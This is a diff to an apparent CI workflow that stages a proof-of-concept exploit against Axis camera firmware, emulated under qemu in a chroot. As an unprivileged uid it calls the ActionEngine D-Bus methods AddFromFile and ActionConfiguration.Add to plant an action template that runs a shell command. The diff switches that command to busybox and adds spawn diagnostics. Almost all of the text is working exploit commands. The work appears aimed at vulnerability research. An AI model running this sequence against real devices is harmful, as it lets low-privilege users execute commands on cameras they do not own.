@@ -163,7 +163,8 @@ jobs:
               </validate_command>
               <start_command>
                 <exec_command>
-                  <path>/bin/sh</path>
+                  <path>/bin/busybox</path>
+                  <exec_argument>sh</exec_argument>
                   <exec_argument>-c</exec_argument>
                   <exec_argument>id &gt; /tmp/proof_ae 2&gt;&amp;1</exec_argument>
                 </exec_command>
@@ -177,6 +178,15 @@ jobs:
           timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | tee /tmp/step1.log | head -6
           echo "step1 exit: $?"
           sleep 2
+          echo "=== spawn diagnostics: /bin/sh + /bin/busybox under qemu in chroot ==="
+          sudo ls -la /opt/rootfs/bin /opt/rootfs/usr/bin/sh /opt/rootfs/usr/bin/busybox 2>&1 | head -6
+          echo "--- direct: /bin/sh -c id ---"
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /bin/sh -c "id" 2>&1 | head -3
+          echo "--- direct: /bin/busybox sh -c id ---"
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /bin/busybox sh -c "id" 2>&1 | head -3
+          echo "--- stored template (verbatim, first 400 chars) ---"
+          sudo head -c 400 /opt/rootfs/etc/actionengine/system/1/actiontemplates/com.axis.action.poc.ae001.xml 2>/dev/null
+          echo ""
           echo "=== STEP 2: uid 150 -> ActionConfiguration.Add(nice_name, template_id, params) [proven order] ==="
           timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration Add ssa{ss} "poc_conf" "com.axis.action.poc.ae001" 0 2>&1 | tee /tmp/confadd.log | head -6
           echo "step2 exit: $?"
